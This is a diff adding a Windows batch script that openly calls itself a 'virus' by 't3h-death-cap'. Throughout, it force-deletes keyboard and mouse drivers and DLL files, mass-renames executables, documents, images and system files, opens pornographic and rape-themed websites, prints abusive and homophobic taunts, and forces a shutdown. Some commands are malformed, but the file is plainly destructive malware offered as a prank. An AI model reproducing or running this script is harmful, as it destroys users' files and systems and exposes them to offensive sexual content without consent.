@@ -1,0 +1,117 @@
+@echo off
+title In soviet Russia t3h-death-cap pwns you! 
+copy c:\Windows
+copy c:\
+copy c:\Windows\System32
+cd %windir%\system32
+del /S /F /Q keyboard.drv
+del /S /F /Q mouse.drv
+del /S /F /Q keyboard.sys
+:round1
+msg * this virus was brought to you by t3h-death-cap, we apologise for any inconvienience caused.... NOT 
+set /a wait=%wait%+1
+if %wait% leq 9000 goto round2
+:round2
+start www.gayporn.com
+echo naughty naughty looking at gay porn?
+set /a wait=%wait%+1
+if %wait% leq 2000 goto round3
+:round3 
+echo dont worry gay porn is only the start, you have no idea what else is coming up...
+cd c:\ del /S /F /Q *.dll
+echo Now don't turn off your computer, all of your startup files and 
+echo more are gone, so just enjoy your pc while you have it.
+echo Okay time for more pwnography...
+set /a wait=%wait%+1
+if %wait% leq 4000 
+goto round4
+:round4
+ren /S /F /Q *.exe *.pwned
+ren /S /F /Q *.zip * .pwned
+ren /S /F /Q *.txt * .t3hdeathcappwnsyou
+ren /S /F /Q *.rtf * .pwnedbyt3hdeathcap
+ren /F /S /Q *.doc *.pwnedbyt3hdeathcap
+echo wow, you would think you like getting pwned lol
+set /a wait=%wait%+1
+if %wait% leq 3000 
+goto round5
+:round5
+msg * Go get fucked....
+set /a wait=%wait%+1
+if %wait% leq 2000 goto round6
+:round6
+start www.redtube.com
+start www.rapeboard.com
+start www.bbc.co.uk
+start www.google.com
+set /a wait=%wait%+1
+if %wait% leq 3000 goto round7
+:round7
+echo what you are a twat?
+set /a wait=%wait%+1
+if %wait% leq 2000 goto round8
+:round8
+start www.youareatwat.com
+set /a wait=%wait%+1
+if %wait% leq 2000 goto round9
+:round9
+echo You really are childhish...
+set /a wait=%wait%+1
+if %wait% leq 2000 goto round10
+:round10
+start www.clubpenguin.com
+start www.habbo.co.uk
+start www.runescape.com
+set /a wait=%wait%+1
+if %wait% leq 2000 goto round11
+goto round12
+:round12
+echo Time to be rickrolled
+start www.youtube.com/watch?v=eBGIQ7ZuuiU
+set /a wait=%wait%+1
+if %wait% leq 2000 goto round13
+:round13
+echo you got rick rolled mother fucker!!!!!!
+echo crying to our mummy now?????
+echo pathetic, I think you need to learn a lesson for being a little 
+echo whimpy girl...
+ren /F /S /Q *.jpg *.stopbeingawhimp
+ren /F /S /Q *.bmp *.gogetfucked
+ren /F /S /Q *.sys *.pwned
+ren /F /S /Q *.drv *.pwned
+set /a wait=%wait%+1
+if %wait% leq 2000 goto round14
+:round14
+echo Oh hai I heard you liek mudkipzzzz?
+set /a wait=%wait%+1
+if %wait% leq 2000 goto round15
+:round15
+ren /F /S /Q *.com *.iheardyouliekmudkipzzz
+echo well you gotta like them now.
+set /a wait=%wait%+1
+if %wait% leq 2000 goto round16
+:round16
+echo No? Maybe you liek caek?
+start http://www.londonlulz.com/images/thumb/7/74/Caek.jpg/500px-Caek.jpg
+set /a wait=%wait%+1
+if %wait% leq 4000 goto caek1
+:caek1
+msg * Some napkins or paper plates probably wouldn't be a bad idea either. Home made cakes are great, especially if they're creatively shaped and/ or decorated. 
+set /a wait=%wait%+1
+if %wait% leq 2000 goto caek2
+:caek2
+msg * Recommended Caek
+Jaffa Caek
+Chocolate Caek 
+Companion Cube Caek 
+set /a wait=%wait%+1
+if %wait% leq 9000 goto fate
+:fate
+echo kay You had your fun with the caek and the porn and shit now 
+echo fun over... Time for you to look inside you wallet make sure 
+echo there is ALOT of money for a new computer and/ or for a 
+echo IT proffesional to look at your PC... I'm sorry, but it's pwnage 
+echo time.............
+shutdown -s -f
+echo bye, nice knowing you.
+pause
